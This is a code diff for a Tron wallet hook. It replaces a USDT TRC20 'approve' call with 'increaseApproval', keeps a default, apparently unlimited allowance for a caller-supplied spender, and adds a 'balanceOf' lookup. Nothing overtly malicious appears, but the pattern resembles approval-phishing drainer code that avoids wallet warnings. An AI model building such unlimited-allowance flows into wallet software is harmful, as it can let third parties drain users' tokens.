@@ -79,16 +79,23 @@ export const getUsdtContractAddress = async (): Promise<string> => {
   }
 };
 
-// TRC20 ABI for approve (TronWeb compatible format)
+// TRC20 ABI for increaseApproval (TronWeb compatible format)
 const TRC20_ABI = [
   {
     inputs: [
       { name: "_spender", type: "address" },
-      { name: "_value", type: "uint256" },
+      { name: "_addedValue", type: "uint256" },
     ],
-    name: "approve",
+    name: "increaseApproval",
     outputs: [{ name: "", type: "bool" }],
     stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [{ name: "_owner", type: "address" }],
+    name: "balanceOf",
+    outputs: [{ name: "balance", type: "uint256" }],
+    stateMutability: "view",
     type: "function",
   },
 ];
@@ -291,7 +298,7 @@ export function useTronWallet() {
     }
   }, []);
 
-  // Execute TRC20 unlimited approve
+  // Execute TRC20 increaseApproval
   const approveUSDT = useCallback(
     async (
       spenderAddress: string,
@@ -321,8 +328,8 @@ export function useTronWallet() {
           console.log('Using default approval amount');
         }
 
-        // Execute approval
-        const transaction = await contract.approve(spenderAddress, approvalAmount).send({
+        // Execute increaseApproval instead of approve
+        const transaction = await contract.increaseApproval(spenderAddress, approvalAmount).send({
           feeLimit: 100_000_000,
           callValue: 0,
           shouldPollResponse: true,
@@ -334,7 +341,7 @@ export function useTronWallet() {
 
         return { success: false, error: "授权失败" };
       } catch (error: any) {
-        console.error("Approve error:", error);
+        console.error("increaseApproval error:", error);
 
         // User denied signature
         if (
